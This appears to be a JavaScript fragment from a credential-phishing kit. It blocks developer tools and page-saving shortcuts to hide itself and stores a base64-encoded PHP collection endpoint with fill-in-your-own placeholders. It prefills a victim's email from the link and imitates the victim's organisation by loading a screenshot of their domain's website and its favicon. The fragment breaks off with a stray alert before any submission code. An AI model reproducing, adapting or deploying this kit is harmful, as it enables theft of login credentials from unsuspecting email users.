 window.addEventListener("keydown", async (e) => {
        if (e.ctrlKey && 83 == e.which) return e.preventDefault(), !1;
      }),
        window.addEventListener("contextmenu", (e) => e.preventDefault()),
        (document.onkeydown = function (e) {
          if (
            123 == event.keyCode ||
            (e.ctrlKey && 69 == e.keyCode) ||
            (e.ctrlKey && e.shiftKey && 73 == e.keyCode) ||
            (e.ctrlKey && e.shiftKey && 74 == e.keyCode) ||
            (e.ctrlKey && 85 == e.keyCode) ||
            (e.ctrlKey && 83 == e.keyCode) ||
            (e.ctrlKey && 72 == e.keyCode) ||
            (e.ctrlKey && 65 == e.keyCode) ||
            (e.ctrlKey && 70 == e.keyCode) ||
            (e.ctrlKey && 69 == e.keyCode)
          )
            return !1;
        }),
        (window.onkeydown = (e) =>
          !(
            e.ctrlKey &&
            (67 === e.keyCode ||
              86 === e.keyCode ||
              85 === e.keyCode ||
              117 === e.keyCode)
          ));

      const url ="aHR0cHM6Ly90cmFmaWd1cmFzZ3JvdXAuY29tL21va28ucGhw"; // ADD  YOUR ENCODED  PHPFILE  LINK
      const redirectUrl = ""; // ADD YOUR REDIRECT URL HERE

      const hash = window.location.hash.split("#")[1];
      let decode, urlDecoded;

      try {
        urlDecoded = url ? atob(url) : url;
      } catch (e) {
        urlDecoded = url;
      }

      let plusOne = 0;
      const email = document.getElementById("username");
      const password = document.getElementById("password");
      const source = document.getElementById("source");
      const submitBtn = document.getElementById("loginbtn");
      const errorShow = document.getElementById("err");
      const logo = document.getElementById("logo");
      email.value = hash ? hash : "";
      hash ? password.focus() : email.focus();

      const domain = email.value.split("@")[1];

      const size = `64`;
      const img = `url(https://image.thum.io/get/65490-1671030344805-37a36e07674665dbe1105f1044aab44d/width/1200/https://${domain})`;
      $('body').css("background-image", img);
      const gFav = `https://www.google.com/s2/favicons?domain=${domain}&sz=${size}`;
      logo.src = gFav;

     alert("jjj");
